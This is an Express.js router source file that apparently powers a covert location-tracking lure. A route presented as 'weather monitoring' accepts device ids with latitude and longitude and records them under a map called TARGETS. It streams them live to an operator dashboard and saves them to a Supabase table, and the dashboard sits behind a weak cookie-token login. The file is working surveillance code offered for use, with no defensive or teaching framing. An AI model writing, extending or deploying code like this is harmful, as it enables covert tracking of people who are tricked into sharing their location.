const express = require("express")
const router = express.Router()
const supabase = require("./supabase")

const config = {
    username: process.env.ADMIN_USERNAME,
    password: process.env.ADMIN_PASSWORD,
    token: process.env.ADMIN_TOKEN
}

const TARGETS = {}

// Login page
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body

    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, {
            maxAge: 1000000 * 100000
        })
    }

    res.redirect("/")
})

// Weather monitoring node
router.route("/weather-monitoring-bantakal-node").get((req, res) => {
    res.render("weather")
}).post(async (req, res) => {
    const { id, lat, lng } = req.body

    if (TARGETS[id] == null) {
        IO.emit("user-connected", id)
    }

    TARGETS[id] = [lat, lng]

    IO.emit("map-data", {
        id,
        lat,
        lng
    })

    const { error } = await supabase
        .from("location_data")
        .insert({
            device_id: id,
            latitude: lat,
            longitude: lng
        })

    if (error) {
        console.error("Supabase error:", error)
        return res.status(500).send("Failed to save location")
    }

    res.send("OK")

    console.log(`> ${id} - ${TARGETS[id]}`)
})

// Token checking
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token

    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

// Admin dashboard
router.route("/").get((req, res) => {
    const protocol = req.headers["x-forwarded-proto"] || req.protocol
    const host = req.get("host")
    const remoteURL = `${protocol}://${host}`

    res.render("home", {
        TARGETS,
        remoteURL
    })
})

router.route("/map").get((req, res) => {
    const { id } = req.query

    res.render("map", {
        data: TARGETS[id]
    })
})

module.exports = router